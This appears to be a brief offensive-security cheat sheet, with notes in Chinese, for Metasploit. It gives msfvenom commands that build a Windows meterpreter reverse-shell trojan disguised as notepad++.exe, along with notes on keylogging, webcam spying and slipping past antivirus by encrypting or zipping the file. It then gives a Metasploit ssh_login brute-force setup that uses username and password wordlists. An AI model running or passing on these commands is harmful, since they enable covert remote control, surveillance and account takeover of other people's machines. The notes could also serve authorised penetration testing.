Metasploit-meterpreter
```php
生成遠端木馬 msfvenom 鍵盤 鏡頭監控
msfvenom -p <payload> lhost=<kali_ip> lport=<port> -f exe <files> -x notepad++.exe -o notepad++.exe 
<payload>= OS windows/架構x64/作用meterpreter/方式reverse_tcp
use exploit/multi/handler
set payload <>
set lhost <>
set lport <>
run
passby AV 加密檔 壓縮檔 包起來
```
弱口令檢查爆破
```php
### msf auxiliary/scanner/
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <ip>
set USER_FILE /path/dic_username_ssh.txt
set PASS_FILE /path/pwd100.txt
run
```
